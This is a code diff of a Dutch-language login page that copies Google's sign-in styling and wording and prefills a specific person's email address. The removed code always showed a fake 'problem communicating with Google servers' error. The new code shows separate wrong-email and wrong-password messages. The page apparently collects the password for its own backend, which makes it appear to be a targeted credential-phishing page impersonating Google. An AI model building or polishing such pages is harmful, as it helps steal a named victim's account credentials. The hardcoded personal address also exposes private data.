@@ -7,13 +7,17 @@ export default function LoginPage() {
   const [email, setEmail] = useState('malouguyader@gmail.com');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
+  const [emailError, setEmailError] = useState(false);
   const [passwordError, setPasswordError] = useState(false);
+  const [errorMessage, setErrorMessage] = useState('');
   const router = useRouter();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
+    setEmailError(false);
     setPasswordError(false);
+    setErrorMessage('');
 
     try {
       const response = await fetch('/api/auth/login', {
@@ -25,8 +29,24 @@ export default function LoginPage() {
       const data = await response.json();
 
       if (!response.ok) {
-        console.log('❌ Login mislukt:', data.error);
-        setPasswordError(true);
+        // ❌ Check of het een email-fout is (403 = Geen toegang)
+        if (response.status === 403) {
+          setEmailError(true);
+          setErrorMessage('Onjuist e-mailadres');
+          setLoading(false);
+          return;
+        }
+
+        // ❌ Check of het een wachtwoord-fout is (401 = Ongeldige inloggegevens)
+        if (response.status === 401) {
+          setPasswordError(true);
+          setErrorMessage('Onjuist wachtwoord');
+          setLoading(false);
+          return;
+        }
+
+        // ❌ Andere fouten
+        setErrorMessage(data.error || 'Er is iets misgegaan');
         setLoading(false);
         return;
       }
@@ -36,7 +56,7 @@ export default function LoginPage() {
       router.refresh();
     } catch (err: any) {
       console.error('❌ Fout:', err);
-      setPasswordError(true);
+      setErrorMessage('Er is iets misgegaan');
       setLoading(false);
     }
   };
@@ -58,7 +78,7 @@ export default function LoginPage() {
       <div className="flex-1 flex flex-col px-6 py-8">
         <div className="w-full max-w-[448px]">
 
-          {/* ⭐ Titel - groter en links uitgelijnd ⭐ */}
+          {/* Titel */}
           <h1 className="text-4xl font-medium text-[#202124] mb-1 tracking-[0.1px] text-left">
             Inloggen
           </h1>
@@ -74,25 +94,21 @@ export default function LoginPage() {
             </a>
           </p>
 
-          {/* Vaste foutmelding */}
-          <div className="mb-6">
-            <div className="text-[#d93025] text-sm font-medium">
-              Kon niet inloggen
+          {/* ⭐ Foutmelding - alleen de specifieke error ⭐ */}
+          {errorMessage && (
+            <div className="mb-6">
+              <div className="text-[#d93025] text-sm font-medium">
+                {errorMessage}
+              </div>
             </div>
-            <div className="text-[#d93025] text-sm">
-              Er was een probleem met de communicatie met de Google-servers.
-            </div>
-            <div className="text-[#d93025] text-sm">
-              Probeer opnieuw.
-            </div>
-          </div>
+          )}
 
           {/* Formulier */}
           <form onSubmit={handleSubmit} className="space-y-4" autoComplete="on">
             <input type="hidden" name="username" value={email} />
             <input type="hidden" name="email" value={email} />
 
-            {/* Email veld */}
+            {/* Email veld - met rode rand bij fout */}
             <div className="relative">
               <input
                 id="email"
@@ -100,17 +116,27 @@ export default function LoginPage() {
                 name="email"
                 required
                 value={email}
-                onChange={(e) => setEmail(e.target.value)}
+                onChange={(e) => {
+                  setEmail(e.target.value);
+                  setEmailError(false);
+                  setErrorMessage('');
+                }}
                 autoComplete="username"
-                className="w-full px-4 pt-[22px] pb-[6px] bg-white border border-[#dadce0] rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer"
+                className={`w-full px-4 pt-[22px] pb-[6px] bg-white border rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer ${
+                  emailError 
+                    ? 'border-[#d93025] ring-2 ring-[#d93025]' 
+                    : 'border-[#dadce0]'
+                }`}
                 placeholder=" "
               />
-              <label className="absolute left-4 top-[6px] text-[12px] text-[#1a73e8] pointer-events-none">
+              <label className={`absolute left-4 top-[6px] text-[12px] pointer-events-none ${
+                emailError ? 'text-[#d93025]' : 'text-[#1a73e8]'
+              }`}>
                 E-mailadres of telefoonnummer
               </label>
             </div>
 
-            {/* Wachtwoord veld */}
+            {/* Wachtwoord veld - met rode rand bij fout */}
             <div className="relative">
               <input
                 id="password"
@@ -121,6 +147,7 @@ export default function LoginPage() {
                 onChange={(e) => {
                   setPassword(e.target.value);
                   setPasswordError(false);
+                  setErrorMessage('');
                 }}
                 autoComplete="current-password"
                 className={`w-full px-4 pt-[22px] pb-[6px] bg-white border rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer ${
@@ -138,13 +165,7 @@ export default function LoginPage() {
               </label>
             </div>
 
-            {passwordError && (
-              <div className="text-[#d93025] text-sm -mt-2">
-                Onjuist wachtwoord
-              </div>
-            )}
-
-            {/* ⭐ Juridische tekst onder wachtwoordveld ⭐ */}
+            {/* Juridische tekst */}
             <div className="text-[12px] text-[#5f6368] leading-relaxed -mt-2">
               Voordat je deze app gaat gebruiken, kun je het{' '}
               <a
